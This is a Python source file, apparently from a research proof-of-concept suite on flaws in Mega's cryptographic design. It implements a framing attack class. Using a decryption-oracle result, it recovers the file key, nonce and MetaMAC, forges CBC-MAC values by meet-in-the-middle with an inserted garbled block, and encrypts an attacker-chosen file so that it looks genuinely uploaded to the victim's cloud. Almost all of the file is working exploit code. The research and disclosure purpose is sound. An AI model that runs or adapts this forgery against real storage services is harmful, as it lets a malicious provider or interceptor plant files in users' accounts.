
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: class implementing the framing attack (used for both the abstract
# example and the MITM PoC)
#

from secrets import token_bytes
from os.path import splitext, basename

from shared.mega_simulation import *
from shared.attack_utils import *
from shared.constants.mega_crypto import *

class MegaFramingAttack():
    """

    ###########
    # Setting #
    ###########

    A malicious cloud provider or TLS-MitM adversary aims to place a malicious
    file in the victim's cloud.

    ##########
    # Attack #
    ##########

    The attack uses a decryption oracle to get generate a file key, nonce, and
    metamac that are indistinguishable from genuinely generated ones.

    Thus, we first recover a file key, nonce, and metamac from the plaintext
    block.

    Then, we construct a file which produces this metamac by using the known
    key to compute the CBC-MAC forward resp. backward until the chunk in which
    we can insert 128 garbled bits. Afterwards, we do the same for the CBC-MAC
    of that chunk and insert the random 128 bits that ensure that the file
    produces the desired MetaMAC.

    Finaly, we encrypt the file using the node key.

    The file cannot be distinguished from genuinely uploaded ones.
    """

    def __init__(self):
        self.node_key_ct = None
        self.forged_file = None

    def _cbc_mac_meet_in_middle(self, k, bs_before, bs_after, tag,
                                iv=b"\x00" * AES_BLOCK_BYTE_SIZE):
        """
        Calculates which block needs to be inserted between `bs_before` and
        `bs_after`, so that all blocks together result in a target CBC-MAC tag

        :param k: key for CBC-MAC
        :param bs_before: blocks before the modifiable one
        :param bs_after: blocks after the modifiable one
        :param tag: CBC-MAC value that the input should produce after we inserted
            an AES block
        :param iv: optional IV value (not commonly used for CBC-MAC)

        :returns: block to insert between `bs_before` and `bs_after`
        """

        # Calculating the intermediate MAC values in forward direction
        bs_before_str = b"".join(bs_before)
        mac_forward = cbc_mac(k, bs_before_str, iv=iv)

        # Calculating backwards requires us to build the CBC-MAC mode from ECB
        # and in the reverse (i.e., decrypting from the desired tag instead of
        # encrypting from the chunks).
        aes_ecb = AES.new(k, AES.MODE_ECB)

        # We start from the target MAC value
        intermediate_mac = tag

        for block in bs_after[::-1]:
            intermediate_mac = xor_bytes(
                aes_ecb.decrypt(intermediate_mac),
                block
            )
        mac_backward = intermediate_mac

        # The forward and backward intermediate MACs define the block we need
        # to insert
        block_to_insert = xor_bytes(
            aes_ecb.decrypt(mac_backward),
            mac_forward
        )

        return block_to_insert

    def set_node_key_ct(self, ct):
        """
        Store node key ciphertext and store it for later.

        :param ct: value to set the ciphertext to (e.g., when it cannot
            be chosen u.a.r.)
        """
        self.node_key_ct = ct

    def get_node_key_ct(self, ct=None):
        """
        Generate a new node key ciphertext and store it for later. If this is
        chosen u.a.r. then the produced encrypted file is indistinguishable from
        a genuinely uploaded one.

        :param ct: optional value to set the ciphertext to (e.g., when it cannot
            be chosen u.a.r.)

        :returns: fresh node key ciphertext
        """

        self.node_key_ct = token_bytes(OBF_NODE_KEY_BYTE_LEN)
        return self.node_key_ct

    def set_node_key_pt(self, pt):
        """
        Store the plaintext corresponding to the AES-ECB decryption of
        self.node_key_ct under the master key (e.g., obtained using the
        decryption attack).

        :param pt: node key plaintext
        """

        if not self.node_key_ct:
            print("WARNING: missing node key ciphertext")

        self.node_key_pt = pt

    def forge_file_ct(self, fname, garble_pos=None, add_attr={}):
        """
        :param fname: Name of the file for which we should forge a ciphertext
        :param garble_pos: AES block index where the file format tolerates 128
            bits of garbled data
        :param add_attr: Additional attributes that should be encrypted

        :returns: file content, file ciphertext, and the encrypted attributes
        """

        # Read and chunk file to encrypt
        with open(fname, "rb") as fp:
            f = fp.read()

        self.file_size = len(f)

        f += b"\x00" * pad_len(len(f), AES_BLOCK_BYTE_SIZE)

        file_aes_blocks = []
        for i in range(0, len(f), AES_BLOCK_BYTE_SIZE):
            file_aes_blocks.append(f[i : i + AES_BLOCK_BYTE_SIZE])

        # If no position is fixed, pick one based on the file format
        if not garble_pos:
            # XXX: add types, search good insertion points.

            # Unsophisticated file type guessing
            if splitext(fname)[1][1:].lower() == "png":
                # PNG files tolerate arbitrary data after the IEND field, which
                # marks the end of the PNG chunks.
                garble_pos = ceil_int_div(len(f), AES_BLOCK_BYTE_SIZE)
            else:
                # Heuristic for unknown file types: add at end
                garble_pos = ceil_int_div(len(f), AES_BLOCK_BYTE_SIZE)

        file_chunks_nr = ceil_int_div(len(file_aes_blocks), FILE_AES_BLOCKS_PER_CHUNK)
        garble_chunk_pos = floor_int_div(garble_pos, FILE_AES_BLOCKS_PER_CHUNK)
        garble_block_pos = garble_pos % FILE_AES_BLOCKS_PER_CHUNK

        #
        # Recover file key, file nonce, and metamac
        #
        kF, nF, metamac = deobfuscate_file_key(self.node_key_pt)

        #
        # Encrypt attributes
        #
        attr_dict = { "n": basename(fname) }
        attr_dict.update(add_attr)
        attr_enc = encrypt_attributes(kF, attr_dict)

        #
        # Randomly construct condensed MAC that produces this metamac
        #
        mac_cond_0 = token_bytes(4)
        mac_cond_1 = xor_bytes(mac_cond_0, metamac[:4])
        mac_cond_2 = token_bytes(4)
        mac_cond_3 = xor_bytes(mac_cond_2, metamac[4:])

        mac_cond = mac_cond_0 + mac_cond_1 + mac_cond_2 + mac_cond_3

        #
        # Perform normal chunk encryptions for unmodified chunks
        #
        chunk_cts = []
        chunk_macs = []
        for i in range(file_chunks_nr):
            if i == garble_chunk_pos:
                chunk_cts.append(None)
                chunk_macs.append(None)
                continue

            off = i * AES_BLOCK_BYTE_SIZE
            chunk = f[off : off + FILE_CHUNK_BYTE_SIZE]

            idx = i * (FILE_CHUNK_BYTE_SIZE // AES_BLOCK_BYTE_SIZE)
            iv = nF + idx.to_bytes(8, "big")
            chunk_ct, chunk_mac = aes_ccm_encrypt(kF, chunk, iv)

            chunk_cts.append(chunk_ct)
            chunk_macs.append(chunk_mac)

        #
        # Calculate the garbled chunk's desired MAC value
        #
        chunk_macs[garble_chunk_pos] = self._cbc_mac_meet_in_middle(
            kF,
            chunk_macs[:garble_chunk_pos],
            chunk_macs[garble_chunk_pos + 1:],
            mac_cond
        )

        # Verify the target conditionl MAC is actually achieved
        assert cbc_mac(kF, b"".join(chunk_macs)) == mac_cond

        #
        # Calculate the garbled AES Block that we need to insert into the target chunk
        #
        i = garble_chunk_pos * FILE_AES_BLOCKS_PER_CHUNK
        garble_chunk_blocks = file_aes_blocks[i : i + FILE_AES_BLOCKS_PER_CHUNK]
        garbled_block = self._cbc_mac_meet_in_middle(
            kF,
            garble_chunk_blocks[:garble_block_pos],
            garble_chunk_blocks[garble_block_pos + 1:],
            chunk_macs[garble_chunk_pos],
            iv=nF + nF
        )

        if garble_block_pos == len(garble_chunk_blocks):
            garble_chunk_blocks.append(garbled_block)
        else:
            garble_chunk_blocks[garble_block_pos] = garbled_block

        # Verify the target chunk mac is actually achieved
        assert cbc_mac(kF, b"".join(garble_chunk_blocks), iv=nF + nF) == chunk_macs[garble_chunk_pos]

        #
        # Insert garbled block, calculate missing ciphertext
        #
        if garble_pos == len(file_aes_blocks):
            file_aes_blocks.append(garbled_block)
        else:
            file_aes_blocks[garble_pos] = garbled_block

        garble_chunk_str = b"".join(garble_chunk_blocks)
        idx = garble_chunk_pos * (FILE_CHUNK_BYTE_SIZE // AES_BLOCK_BYTE_SIZE)
        iv = nF + idx.to_bytes(8, "big")
        chunk_ct, chunk_mac = aes_ccm_encrypt(kF, garble_chunk_str, iv)

        chunk_cts[garble_chunk_pos] = chunk_ct
        assert chunk_mac == chunk_macs[garble_chunk_pos]

        file_content = b"".join(file_aes_blocks)
        file_content_enc = b"".join(chunk_cts)

        self.forged_file = (file_content, file_content_enc, attr_enc)
        return file_content, file_content_enc, attr_enc
